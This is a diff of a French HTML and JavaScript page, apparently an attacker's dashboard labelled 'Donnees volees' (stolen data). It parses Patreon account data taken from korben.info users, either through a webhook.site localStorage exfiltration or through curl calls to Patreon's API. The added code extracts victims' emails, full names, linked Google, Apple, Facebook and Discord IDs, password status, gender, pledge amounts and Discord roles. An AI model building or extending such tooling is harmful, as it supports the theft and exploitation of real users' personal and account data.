@@ -99,25 +99,30 @@
   <div class="step">
     <div class="step-header">
       <span class="step-num">2</span>
-      <h2>Donnees exfiltrees <span class="tag tag-leaked">LEAKED</span></h2>
+      <h2>Donnees volees <span class="tag tag-leaked">LEAKED</span></h2>
     </div>
     <div class="step-body">
-      <p>Collez le contenu recu sur webhook.site (le parametre <code>d</code> decode) pour l'afficher proprement.</p>
-      <textarea id="raw-data" placeholder="Collez le JSON du webhook ici..."></textarea>
-      <div style="margin-top:8px;">
-        <button class="btn btn-green" onclick="parseResults()">Afficher les resultats</button>
+      <p>Collez le JSON brut (webhook localStorage, curl API v1, curl API v2) — le parseur detecte automatiquement le format.</p>
+      <textarea id="raw-data" placeholder="Collez le JSON ici (webhook, curl v1, curl v2)..." style="min-height:100px;"></textarea>
+      <div style="margin-top:8px;display:flex;gap:8px;">
+        <button class="btn btn-green" onclick="parseResults()">Parser et afficher</button>
+        <button class="btn btn-outline" onclick="clearResults()">Reset</button>
       </div>
       <div id="parsed-results" style="display:none;">
         <div class="results" style="margin-top:16px;">
-          <div class="results-header">Identite Patreon</div>
+          <div class="results-header">Identite</div>
           <div class="results-body" id="identity-data"></div>
         </div>
         <div class="results">
-          <div class="results-header">Abonnements / Memberships</div>
+          <div class="results-header">Abonnements / Campagnes</div>
           <div class="results-body" id="membership-data"></div>
         </div>
         <div class="results">
-          <div class="results-header">Donnees korben.info</div>
+          <div class="results-header">Donnees sensibles supplementaires</div>
+          <div class="results-body" id="extra-data"></div>
+        </div>
+        <div class="results">
+          <div class="results-header">Donnees korben.info (localStorage)</div>
           <div class="results-body" id="korben-data"></div>
         </div>
       </div>
@@ -239,6 +244,14 @@ function copyUrl(type) {
   navigator.clipboard.writeText(url);
 }
 
+function clearResults() {
+  document.getElementById('parsed-results').style.display = 'none';
+  document.getElementById('raw-data').value = '';
+  ['identity-data','membership-data','extra-data','korben-data'].forEach(function(id) {
+    document.getElementById(id).textContent = '';
+  });
+}
+
 function parseResults() {
   var raw = document.getElementById('raw-data').value.trim();
   if (!raw) return;
@@ -248,7 +261,7 @@ function parseResults() {
     try { data = JSON.parse(decodeURIComponent(raw)); } catch(e2) {
       var el = document.getElementById('identity-data');
       el.textContent = '';
-      addRow(el, 'Erreur', 'JSON invalide. Collez le contenu du parametre "d" decode.');
+      addRow(el, 'Erreur', 'JSON invalide');
       document.getElementById('parsed-results').style.display = 'block';
       return;
     }
@@ -259,45 +272,150 @@ function parseResults() {
 
   var idBox = document.getElementById('identity-data');
   var memBox = document.getElementById('membership-data');
+  var extBox = document.getElementById('extra-data');
   var korBox = document.getElementById('korben-data');
   idBox.textContent = '';
   memBox.textContent = '';
+  extBox.textContent = '';
   korBox.textContent = '';
 
+  // Detect format
+  if (data.korben_patreon_auth) {
+    // FORMAT: webhook localStorage exfil
+    parseWebhookData(data, idBox, memBox, extBox, korBox);
+  } else if (data.data && data.data.type === 'user' && data.data.attributes) {
+    if (data.data.attributes.google_id !== undefined) {
+      // FORMAT: Patreon API v1
+      parseV1(data.data.attributes, idBox, memBox, extBox);
+    } else if (data.included) {
+      // FORMAT: Patreon API v2
+      parseV2(data, idBox, memBox, extBox);
+    } else {
+      // FORMAT: Patreon API v2 sans included
+      parseV2(data, idBox, memBox, extBox);
+    }
+  } else {
+    addRow(idBox, 'Format inconnu', 'JSON detecte mais format non reconnu');
+    addRow(idBox, 'Taille', JSON.stringify(data).length + ' caracteres');
+  }
+
+  if (!idBox.hasChildNodes()) addRow(idBox, '', 'Aucune donnee');
+  if (!memBox.hasChildNodes()) addRow(memBox, '', 'Aucun abonnement detecte');
+  if (!extBox.hasChildNodes()) addRow(extBox, '', 'Aucune donnee supplementaire');
+}
+
+function parseWebhookData(data, idBox, memBox, extBox, korBox) {
+  // Parse korben_patreon_auth from localStorage
   if (data.korben_patreon_auth) {
     try {
       var auth = typeof data.korben_patreon_auth === 'string' ? JSON.parse(data.korben_patreon_auth) : data.korben_patreon_auth;
-      if (auth.email) addRow(idBox, 'Email', auth.email, true);
-      if (auth.fullName) addRow(idBox, 'Nom complet', auth.fullName, true);
-      if (auth.patreonId) addRow(idBox, 'Patreon ID', auth.patreonId, true);
-      if (auth.imageUrl) addRow(idBox, 'Photo de profil', auth.imageUrl, true);
-      if (auth.tier) addRow(idBox, 'Tier', auth.tier);
-      if (auth.isActivePatron !== undefined) addRow(idBox, 'Patron actif', auth.isActivePatron ? 'OUI' : 'NON');
 
-      if (auth.memberships && auth.memberships.length) {
-        auth.memberships.forEach(function(m) {
-          addRow(memBox, 'Campagne', m.campaignName || m.campaign || 'N/A');
-          if (m.patronStatus) addRow(memBox, 'Statut', m.patronStatus);
-          if (m.currentlyEntitledAmountCents) addRow(memBox, 'Montant', (m.currentlyEntitledAmountCents / 100) + ' EUR');
-          addSeparator(memBox);
-        });
+      // Peut etre un objet direct ou contenir data.attributes (format API)
+      var attrs = null;
+      if (auth.data && auth.data.attributes) {
+        attrs = auth.data.attributes;
+        addRow(idBox, 'Patreon ID', auth.data.id, true);
+      } else {
+        attrs = auth;
       }
+
+      if (attrs.email) addRow(idBox, 'Email', attrs.email, true);
+      if (attrs.full_name || attrs.fullName) addRow(idBox, 'Nom complet', attrs.full_name || attrs.fullName, true);
+      if (attrs.image_url || attrs.imageUrl) addRow(idBox, 'Photo de profil', attrs.image_url || attrs.imageUrl);
+      if (attrs.created) addRow(idBox, 'Compte cree', attrs.created);
+      if (attrs.is_email_verified) addRow(idBox, 'Email verifie', 'OUI');
+      if (attrs.url) addRow(idBox, 'Profil Patreon', attrs.url);
+
+      // Memberships from included
+      var included = auth.included || [];
+      var campaigns = {};
+      var tiers = {};
+      included.forEach(function(inc) {
+        if (inc.type === 'campaign') campaigns[inc.id] = inc.attributes;
+        if (inc.type === 'tier') tiers[inc.id] = inc.attributes;
+      });
+      included.forEach(function(inc) {
+        if (inc.type === 'member') {
+          var a = inc.attributes;
+          var campId = inc.relationships && inc.relationships.campaign && inc.relationships.campaign.data ? inc.relationships.campaign.data.id : null;
+          var campName = campId && campaigns[campId] ? campaigns[campId].creation_name : 'Campagne #' + campId;
+          addRow(memBox, 'Campagne', campName);
+          addRow(memBox, 'Statut', a.patron_status || 'free');
+          if (a.currently_entitled_amount_cents > 0) addRow(memBox, 'Montant', (a.currently_entitled_amount_cents / 100) + ' EUR', true);
+          // Tier info
+          var entTiers = inc.relationships && inc.relationships.currently_entitled_tiers && inc.relationships.currently_entitled_tiers.data || [];
+          entTiers.forEach(function(t) {
+            if (tiers[t.id]) {
+              addRow(memBox, 'Tier', tiers[t.id].title);
+              if (tiers[t.id].discord_role_ids && tiers[t.id].discord_role_ids.length) {
+                addRow(memBox, 'Discord Role', tiers[t.id].discord_role_ids.join(', '), true);
+              }
+            }
+          });
+          addSeparator(memBox);
+        }
+      });
     } catch(e) {
-      addRow(idBox, 'Raw', JSON.stringify(data.korben_patreon_auth).substring(0, 500), true);
+      addRow(idBox, 'Erreur parsing', e.message);
     }
   }
 
+  // Other localStorage keys
   Object.keys(data).forEach(function(key) {
     if (key === 'korben_patreon_auth') return;
-    var val = data[key];
-    if (typeof val === 'object') val = JSON.stringify(val);
-    if (typeof val === 'string' && val.length > 200) val = val.substring(0, 200) + '...';
-    addRow(korBox, key, val);
+    addRow(korBox, key, String(data[key]));
   });
+}
 
-  if (!idBox.hasChildNodes()) addRow(idBox, '', 'Aucune donnee Patreon trouvee');
-  if (!memBox.hasChildNodes()) addRow(memBox, '', 'Aucun abonnement');
-  if (!korBox.hasChildNodes()) addRow(korBox, '', 'Aucune autre donnee');
+function parseV1(a, idBox, memBox, extBox) {
+  addRow(idBox, 'Email', a.email || 'N/A', true);
+  addRow(idBox, 'Nom complet', a.full_name || 'N/A', true);
+  addRow(idBox, 'Prenom', a.first_name || 'N/A');
+  addRow(idBox, 'Photo', a.image_url || 'N/A');
+  addRow(idBox, 'Compte cree', a.created || 'N/A');
+  addRow(idBox, 'Email verifie', String(a.is_email_verified));
+  addSeparator(extBox);
+  addRow(extBox, 'Google ID', a.google_id || 'null', true);
+  addRow(extBox, 'has_password', String(a.has_password), true);
+  addRow(extBox, 'Gender', String(a.gender));
+  addRow(extBox, 'Apple ID', String(a.apple_id || 'null'));
+  addRow(extBox, 'Facebook ID', String(a.facebook_id || 'null'));
+  addRow(extBox, 'Discord ID', String(a.discord_id || 'null'));
+  addRow(extBox, 'Supprime', String(a.is_deleted));
+  addRow(extBox, 'Suspendu', String(a.is_suspended));
+  addRow(extBox, 'Nuked', String(a.is_nuked));
+  if (a.social_connections) {
+    addSeparator(extBox);
+    addRow(extBox, 'Connexions sociales', Object.keys(a.social_connections).filter(function(k) { return a.social_connections[k] !== null; }).join(', ') || 'Aucune');
+  }
+}
+
+function parseV2(data, idBox, memBox, extBox) {
+  var a = data.data.attributes;
+  addRow(idBox, 'Patreon ID', data.data.id, true);
+  addRow(idBox, 'Email', a.email || 'N/A', true);
+  addRow(idBox, 'Nom complet', a.full_name || 'N/A', true);
+  addRow(idBox, 'Photo', a.image_url || 'N/A');
+  addRow(idBox, 'Compte cree', a.created || 'N/A');
+  addRow(idBox, 'Vanity', a.vanity || 'null');
+
+  if (data.included) {
+    var campaigns = {};
+    data.included.forEach(function(inc) {
+      if (inc.type === 'campaign') campaigns[inc.id] = inc.attributes;
+    });
+    data.included.forEach(function(inc) {
+      if (inc.type === 'member') {
+        var ma = inc.attributes;
+        var campId = inc.relationships && inc.relationships.campaign && inc.relationships.campaign.data ? inc.relationships.campaign.data.id : null;
+        var campName = campId && campaigns[campId] ? campaigns[campId].creation_name : 'Campagne #' + campId;
+        addRow(memBox, 'Campagne', campName);
+        addRow(memBox, 'Statut', ma.patron_status || 'free');
+        if (ma.currently_entitled_amount_cents > 0) addRow(memBox, 'Montant', (ma.currently_entitled_amount_cents / 100) + ' EUR', true);
+        addSeparator(memBox);
+      }
+    });
+  }
 }
 
 function exchangeCode() {
